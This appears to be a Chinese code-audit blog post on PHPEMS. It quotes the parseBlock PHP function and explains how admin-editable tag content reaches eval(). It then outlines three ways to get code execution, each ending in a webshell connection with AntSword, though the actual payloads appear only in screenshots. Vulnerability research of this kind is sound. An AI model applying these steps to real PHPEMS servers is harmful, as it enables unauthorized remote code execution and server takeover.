+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202402031344783.png" title="image-20240203134428647" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202402031344783.png" alt="image-20240203134428647"></a></p>
+<p>主要是这个函数</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">parseBlock</span>(<span class="params"><span class="variable">$blockid</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$block</span> = <span class="variable language_">$this</span>-&gt;block-&gt;<span class="title function_ invoke__">getBlockById</span>(<span class="variable">$blockid</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$block</span>[<span class="string">&#x27;blocktype&#x27;</span>] == <span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">html_entity_decode</span>(<span class="variable">$block</span>[<span class="string">&#x27;blockcontent&#x27;</span>][<span class="string">&#x27;content&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">elseif</span>(<span class="variable">$block</span>[<span class="string">&#x27;blocktype&#x27;</span>] == <span class="number">2</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$block</span>[<span class="string">&#x27;blockcontent&#x27;</span>][<span class="string">&#x27;app&#x27;</span>] == <span class="string">&#x27;content&#x27;</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="variable">$args</span> = <span class="keyword">array</span>(<span class="string">&#x27;catid&#x27;</span>=&gt;<span class="variable">$block</span>[<span class="string">&#x27;blockcontent&#x27;</span>][<span class="string">&#x27;catid&#x27;</span>],<span class="string">&#x27;number&#x27;</span>=&gt;<span class="variable">$block</span>[<span class="string">&#x27;blockcontent&#x27;</span>][<span class="string">&#x27;number&#x27;</span>],<span class="string">&#x27;query&#x27;</span>=&gt;<span class="variable">$block</span>[<span class="string">&#x27;blockcontent&#x27;</span>][<span class="string">&#x27;query&#x27;</span>]);</span><br><span class="line">            <span class="variable">$blockdata</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">_getBlockContentList</span>(<span class="variable">$args</span>);</span><br><span class="line">            <span class="variable">$tp</span> = <span class="variable language_">$this</span>-&gt;tpl-&gt;<span class="title function_ invoke__">fetchContent</span>(<span class="title function_ invoke__">html_entity_decode</span>(<span class="variable">$this</span>-&gt;ev-&gt;<span class="title function_ invoke__">stripSlashes</span>(<span class="variable">$block</span>[<span class="string">&#x27;blockcontent&#x27;</span>][<span class="string">&#x27;template&#x27;</span>])));</span><br><span class="line">            <span class="variable">$blockcat</span> = <span class="variable language_">$this</span>-&gt;category-&gt;<span class="title function_ invoke__">getCategoryById</span>(<span class="variable">$block</span>[<span class="string">&#x27;blockcontent&#x27;</span>][<span class="string">&#x27;catid&#x27;</span>]);</span><br><span class="line">            <span class="variable">$blockcatchildren</span> = <span class="variable language_">$this</span>-&gt;category-&gt;<span class="title function_ invoke__">getCategoriesByArgs</span>(<span class="keyword">array</span>(<span class="keyword">array</span>(<span class="string">&quot;AND&quot;</span>,<span class="string">&quot;catparent = :catparent&quot;</span>,<span class="string">&#x27;catparent&#x27;</span>,<span class="variable">$block</span>[<span class="string">&#x27;blockcontent&#x27;</span>][<span class="string">&#x27;catid&#x27;</span>])));</span><br><span class="line">            <span class="keyword">eval</span>(<span class="string">&#x27; ?&gt;&#x27;</span>.<span class="variable">$tp</span>.<span class="string">&#x27;&lt;?php</span></span><br><span class="line"><span class="string"> namespace PHPEMS; &#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="variable">$args</span> = <span class="keyword">array</span>(<span class="string">&#x27;catid&#x27;</span>=&gt;<span class="variable">$block</span>[<span class="string">&#x27;blockcontent&#x27;</span>][<span class="string">&#x27;catid&#x27;</span>],<span class="string">&#x27;number&#x27;</span>=&gt;<span class="variable">$block</span>[<span class="string">&#x27;blockcontent&#x27;</span>][<span class="string">&#x27;number&#x27;</span>],<span class="string">&#x27;query&#x27;</span>=&gt;<span class="variable">$block</span>[<span class="string">&#x27;blockcontent&#x27;</span>][<span class="string">&#x27;query&#x27;</span>]);</span><br><span class="line">            <span class="variable">$obj</span> = \PHPEMS\ginkgo::<span class="title function_ invoke__">make</span>(<span class="string">&#x27;api&#x27;</span>,<span class="variable">$block</span>[<span class="string">&#x27;blockcontent&#x27;</span>][<span class="string">&#x27;app&#x27;</span>]);</span><br><span class="line">            <span class="keyword">if</span>(<span class="title function_ invoke__">method_exists</span>(<span class="variable">$obj</span>,<span class="string">&#x27;parseBlock&#x27;</span>))</span><br><span class="line">                <span class="variable">$blockdata</span> = <span class="variable">$obj</span>-&gt;<span class="title function_ invoke__">parseBlock</span>(<span class="variable">$args</span>);</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">elseif</span>(<span class="variable">$block</span>[<span class="string">&#x27;blocktype&#x27;</span>] == <span class="number">3</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$block</span>[<span class="string">&#x27;blockcontent&#x27;</span>][<span class="string">&#x27;sql&#x27;</span>])</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="variable">$sql</span> = <span class="keyword">array</span>(<span class="string">&#x27;sql&#x27;</span> =&gt; <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;[TABLEPRE]&#x27;</span>,DTH,<span class="variable">$block</span>[<span class="string">&#x27;blockcontent&#x27;</span>][<span class="string">&#x27;sql&#x27;</span>]));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="variable">$tables</span> = <span class="title function_ invoke__">array_filter</span>(<span class="title function_ invoke__">explode</span>(<span class="string">&#x27;,&#x27;</span>,<span class="variable">$block</span>[<span class="string">&#x27;blockcontent&#x27;</span>][<span class="string">&#x27;dbtable&#x27;</span>]));</span><br><span class="line">            <span class="variable">$querys</span> = <span class="title function_ invoke__">array_filter</span>(<span class="title function_ invoke__">explode</span>(<span class="string">&quot;\n&quot;</span>,<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;\r&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="title function_ invoke__">html_entity_decode</span>(<span class="variable">$this</span>-&gt;ev-&gt;<span class="title function_ invoke__">stripSlashes</span>(<span class="variable">$block</span>[<span class="string">&#x27;blockcontent&#x27;</span>][<span class="string">&#x27;query&#x27;</span>])))));</span><br><span class="line">            <span class="variable">$args</span> = <span class="keyword">array</span>();</span><br><span class="line">            <span class="keyword">foreach</span>(<span class="variable">$querys</span> <span class="keyword">as</span> <span class="variable">$p</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="variable">$a</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;|&#x27;</span>,<span class="variable">$p</span>);</span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$a</span>[<span class="number">3</span>])</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="keyword">if</span>(<span class="variable">$a</span>[<span class="number">3</span>][<span class="number">0</span>] == <span class="string">&#x27;$&#x27;</span>)</span><br><span class="line">                    &#123;</span><br><span class="line">                        <span class="variable">$s</span> = <span class="title function_ invoke__">stripos</span>(<span class="variable">$a</span>[<span class="number">3</span>],<span class="string">&#x27;[&#x27;</span>);</span><br><span class="line">                        <span class="variable">$k</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$a</span>[<span class="number">3</span>],<span class="number">1</span>,<span class="variable">$s</span>-<span class="number">1</span>);</span><br><span class="line">                        <span class="variable">$v</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$a</span>[<span class="number">3</span>],<span class="variable">$s</span>,(<span class="title function_ invoke__">strlen</span>(<span class="variable">$a</span>[<span class="number">3</span>]) - <span class="variable">$s</span>));</span><br><span class="line">                        <span class="variable">$execode</span> = <span class="string">&quot;\$a[3] = \&quot;&#123;\$this-&gt;tpl_var[&#x27;<span class="subst">$k</span>&#x27;]<span class="subst">$v</span>&#125;\&quot;;&quot;</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">else</span></span><br><span class="line">                    &#123;</span><br><span class="line">                        <span class="variable">$k</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$a</span>[<span class="number">3</span>],<span class="number">2</span>,(<span class="title function_ invoke__">strlen</span>(<span class="variable">$a</span>[<span class="number">3</span>]) - <span class="number">2</span>));</span><br><span class="line">                        <span class="variable">$execode</span> = <span class="string">&quot;\$a[3] = \&quot;&#123;\$<span class="subst">$k</span>&#125;\&quot;;&quot;</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">eval</span>(<span class="variable">$execode</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="variable">$args</span>[] = <span class="variable">$a</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="variable">$data</span> = <span class="keyword">array</span>(<span class="literal">false</span>,<span class="variable">$tables</span>,<span class="variable">$args</span>,<span class="literal">false</span>,<span class="variable">$block</span>[<span class="string">&#x27;blockcontent&#x27;</span>][<span class="string">&#x27;order&#x27;</span>],<span class="variable">$block</span>[<span class="string">&#x27;blockcontent&#x27;</span>][<span class="string">&#x27;limit&#x27;</span>]);</span><br><span class="line">            <span class="variable">$sql</span> = <span class="variable language_">$this</span>-&gt;pdosql-&gt;<span class="title function_ invoke__">makeSelect</span>(<span class="variable">$data</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$blockdata</span> = <span class="variable language_">$this</span>-&gt;db-&gt;<span class="title function_ invoke__">fetchAll</span>(<span class="variable">$sql</span>,<span class="variable">$block</span>[<span class="string">&#x27;blockcontent&#x27;</span>][<span class="string">&#x27;index&#x27;</span>]?<span class="variable">$block</span>[<span class="string">&#x27;blockcontent&#x27;</span>][<span class="string">&#x27;index&#x27;</span>]:<span class="literal">false</span>,<span class="variable">$block</span>[<span class="string">&#x27;blockcontent&#x27;</span>][<span class="string">&#x27;serial&#x27;</span>]?<span class="variable">$block</span>[<span class="string">&#x27;blockcontent&#x27;</span>][<span class="string">&#x27;serial&#x27;</span>]:<span class="literal">false</span>);</span><br><span class="line">        <span class="variable">$tp</span> = <span class="variable language_">$this</span>-&gt;tpl-&gt;<span class="title function_ invoke__">fetchContent</span>(<span class="title function_ invoke__">html_entity_decode</span>(<span class="variable">$this</span>-&gt;ev-&gt;<span class="title function_ invoke__">stripSlashes</span>(<span class="variable">$block</span>[<span class="string">&#x27;blockcontent&#x27;</span>][<span class="string">&#x27;template&#x27;</span>])));</span><br><span class="line">        <span class="keyword">eval</span>(<span class="string">&#x27; ?&gt;&#x27;</span>.<span class="variable">$tp</span>.<span class="string">&#x27;&lt;?php</span></span><br><span class="line"><span class="string"> namespace PHPEMS; &#x27;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">elseif</span>(<span class="variable">$block</span>[<span class="string">&#x27;blocktype&#x27;</span>] == <span class="number">4</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$tp</span> = <span class="variable language_">$this</span>-&gt;tpl-&gt;<span class="title function_ invoke__">fetchContent</span>(<span class="title function_ invoke__">html_entity_decode</span>(<span class="variable">$this</span>-&gt;ev-&gt;<span class="title function_ invoke__">stripSlashes</span>(<span class="variable">$block</span>[<span class="string">&#x27;blockcontent&#x27;</span>][<span class="string">&#x27;content&#x27;</span>])));</span><br><span class="line">        <span class="keyword">eval</span>(<span class="string">&#x27; ?&gt;&#x27;</span>.<span class="variable">$tp</span>.<span class="string">&#x27;&lt;?php</span></span><br><span class="line"><span class="string"> namespace PHPEMS; &#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>他的逻辑，就是从数据库里取出block的值，然后进行相关操作</p>
+<p>在后台的内容-标签管理处</p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202402031352583.png" title="image-20240203135237490" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202402031352583.png" alt="image-20240203135237490"></a></p>
+<p>可以设置4种不同的类型，对应的就是<code>blocktype</code>的值</p>
+<p>然后这个系统定义的标签会在注册页面触发，通过修改这个里面的值就会造成代码执行</p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202402031354798.png" title="image-20240203135423716" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202402031354798.png" alt="image-20240203135423716"></a></p>
+<p>对于这种会存入数据库再取出来的操作，这中间的过程可以不用了解的太详细，可以直接看取出的结果，如果取出的结果不是我们想要的，再去看如何存取就行了。</p>
+<p>可以知道这里代码执行都是使用</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">eval</span>(<span class="string">&#x27; ?&gt;&#x27;</span>.<span class="variable">$tp</span>.<span class="string">&#x27;&lt;?php</span></span><br><span class="line"><span class="string"> namespace PHPEMS; &#x27;</span>);</span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202402031356636.png" title="image-20240203135625492" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202402031356636.png" alt="image-20240203135625492"></a></p>
+<p>代码执行到这时，<code>$tpl</code>的值就是我们原封不动写进模板的值。</p>
+<p>在这里要注意，必须要先声明一个对象，再执行恶意代码。这是php的龟腚：<code>Namespace declaration statement has to be the very first statement or after any declare call</code></p>
+<h2 id="漏洞利用-1"><a href="#漏洞利用-1" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>可以看到除了第一种类型的block，其他三种都有<code>eval</code>函数</p>
+<p>所以有三种打法</p>
+<h3 id="标签类型为分类列表"><a href="#标签类型为分类列表" class="headerlink" title="标签类型为分类列表"></a>标签类型为分类列表</h3><p>应用要为<code>内容</code></p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202402031400434.png" title="image-20240203140018343" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202402031400434.png" alt="image-20240203140018343"></a></p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202402031401226.png" title="image-20240203140110906" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202402031401226.png" alt="image-20240203140110906"></a></p>
+<p>然后蚁剑连接即可</p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202402031401270.png" title="image-20240203140158196" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202402031401270.png" alt="image-20240203140158196"></a></p>
+<h3 id="标签类型为SQL模式"><a href="#标签类型为SQL模式" class="headerlink" title="标签类型为SQL模式"></a>标签类型为SQL模式</h3><p>这里手写SQL的值必须为空</p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202402031405707.png" title="image-20240203140521613" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202402031405707.png" alt="image-20240203140521613"></a></p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202402031404497.png" title="image-20240203140441345" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202402031404497.png" alt="image-20240203140441345"></a></p>
+<p>蚁剑连接即可</p>
+<h3 id="标签类型为模板模式"><a href="#标签类型为模板模式" class="headerlink" title="标签类型为模板模式"></a>标签类型为模板模式</h3><p>直接写就行</p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202402031406397.png" title="image-20240203140645315" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202402031406397.png" alt="image-20240203140645315"></a></p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202402031407650.png" title="image-20240203140705496" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202402031407650.png" alt="image-20240203140705496"></a></p>
+<p>蚁剑连接即可</p>
+</div><script src="https://jsd.onmicrosoft.cn/npm/hexo-theme-a4@latest/source/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {
+        var options = {
+            selector: '.gallery-item'
+        };
+        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);
+        }</script>
+    </div>
+
+    <div class="post-meta">
+        <i>
+        
+            <span>2024-03-01</span>
+            
+                <span>该篇文章被 John Doe</span>
+            
+            
+                <span>打上标签:
+                    
+                    
+                        <a href='/tags/php/'>
+                            php
+                        </a>
+                    
+                </span>
+             
+             
+                <span>归为分类:
+                    
+                    
+                        <a href='/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/'>
+                            代码审计
+                        </a>
+                    
+                </span>
+            
+        
+        </i>
+    </div>
+    <br>
+    
+    <!-- <div class="post-footer-pre-next">
+        <span>上一篇：<a href=""></a></span>
+        <span class="post-footer-pre-next-last-span-right">上一篇：<a href=""></a></span>
+    </div> -->
+
+    
+        
+    <div class="comments-container">
+    <div id="comment-anchor"></div>
+    <div class="comment-area-title">
+         
+    </div>
+    
+        
+
+    <div id="waline"></div>
+    <script type="module"  >
+        import { init } from 'https://npm.elemecdn.com/hexo-theme-a4@latest/source/js/waline.mjs'; 
+        function loadWaline() {
+            init({
+                el: '#waline',
+                serverURL: 'https://a4-talk.vercel.app',
+                lang: 'zh-CN',
+                dark: 'body[class~="dark-mode"]',
+                requiredMeta: ['nick','mail'], // cannot customize by theme config, change it yourself
+                search: false, // 禁止表情包搜索
+                reaction: false, // 对文章打分
+                pageview: false, // 浏览量统计
+                comment: false, // 评论数统计
+
+                locale: {
+                    placeholder: '欢迎评论', 
+                    sofa: ''
+                },
+            });
+            
+        }
+        window.addEventListener('DOMContentLoaded', loadWaline);
+    </script>
+
+
+
+    
+    
+    
+    </div>
+
+
+     
+</div>
+
+
+
+                                      
+                    
+                    
+                    <div class="footer">
+    
+        <span> 
+            © 1949-2024 China 
+
+            
+                
+
+            
+        </span>
+    
+</div>
+<!--这是指一条线往下的内容-->
+<div class="footer-last">
+    
+            <span>🌊面朝大海，春暖花开🌸</span>
+            
+                <span class="footer-last-span-right"><i>本站由<a target="_blank" rel="noopener" href="https://hexo.io/zh-cn/index.html">Hexo</a>驱动｜使用<a target="_blank" rel="noopener" href="https://github.com/HiNinoJay/hexo-theme-A4">Hexo-theme-A4</a>主题</i></span>
+            
+    
+</div>
+
+
+    
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.4.0/jquery.min.js"></script>
+
+    <!--目录-->
+    
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/1.7.2/jquery.min.js" type="text/javascript" ></script>
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/jqueryui/1.12.1/jquery-ui.min.js" type="text/javascript" ></script>
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.tocify/1.9.0/javascripts/jquery.tocify.min.js" type="text/javascript" ></script>
+        
+<script src="/js/toc.js"></script>
+
+    
+
+    
+<script src="/js/randomHeaderContent.js"></script>
+
+    <!--回到顶部按钮-->
+    
+        
+<script src="/js/returnToTop.js"></script>
+
+    
+
+    
+        
+<script src="/js/returnToLastPage.js"></script>
+
+    
+
+
+
+
+
+<script src="/js/lightgallery.min.js"></script>
+
+
+
+                </div>
+            
+            
+                <!-- 回到顶部的按钮-->  
+                <div class="progress-wrap shadow-drop-2-bottom">
+                    <svg class="progress-circle svg-content" width="100%" height="100%" viewBox="-1 -1 102 102">
+                        <path d="M50,1 a49,49 0 0,1 0,98 a49,49 0 0,1 0,-98"/>
+                    </svg>
+                </div>
+            
+            
+                <!-- 返回的按钮-->  
+                <div class="return-to-last-progress-wrap shadow-drop-2-bottom">
+                    <svg class="progress-circle svg-content" width="100%" height="100%" viewBox="-1 -1 102 102">
+                        <path d="M50,1 a49,49 0 0,1 0,98 a49,49 0 0,1 0,-98"/>
+                    </svg>
+                </div>
+            
+    </body>
+
+
+    <!--暗黑模式-->
+    <script src="/js/darkmode-js.min.js"></script>
+    <script>
+        function addDarkmodeWidget() {
+        const options = {
+            bottom: '53px', // default: '32px'
+            right: 'unset', // default: '32px'
+            left: '42px', // default: 'unset'
+            time: '0.3s', // default: '0.3s'
+            mixColor: '#fff', // default: '#fff'
+            backgroundColor: ' #e4e4e4  ',  // default: '#fff'
+            buttonColorDark: '#100f2c',  // default: '#100f2c'
+            buttonColorLight: '#fff', // default: '#fff'
+            saveInCookies: true, // default: true,
+            label: '🌓', // default: ''
+            autoMatchOsTheme: true // default: true
+        }
+    
+        const darkmode = new Darkmode(options);
+        darkmode.showWidget();
+        
+        }
+        window.addEventListener('load', addDarkmodeWidget);
+    </script>
+  
+</html>
